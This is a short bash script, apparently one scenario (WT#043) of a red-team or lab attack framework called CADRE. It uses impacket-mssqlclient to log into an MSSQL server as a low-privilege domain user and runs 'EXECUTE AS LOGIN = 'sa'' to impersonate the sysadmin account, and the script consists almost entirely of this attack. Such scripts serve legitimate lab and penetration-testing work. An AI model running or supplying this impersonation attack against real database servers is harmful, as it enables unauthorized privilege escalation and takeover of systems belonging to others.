#!/bin/bash
# CADRE — WT#043 MSSQL Impersonation
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#043 — MSSQL Impersonation"
start_attack "043" "MSSQL Impersonation"

require_tool impacket-mssqlclient
require_env MBR01 "MBR01"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "EXECUTE AS LOGIN = sa via impacket-mssqlclient (-file, timeout)"
run_cmd "SQLF=\$(mktemp); printf '%s\\n' \"EXECUTE AS LOGIN = 'sa';\" \"SELECT SYSTEM_USER;\" > \"\$SQLF\"; timeout 45 impacket-mssqlclient \"${DOMAIN_CHILD}/analyst_t1:${MSSQL_PASS}@${MBR01}\" -windows-auth -file \"\$SQLF\"; RC=\$?; rm -f \"\$SQLF\"; exit \$RC"

result $? "MSSQL Impersonation completed"
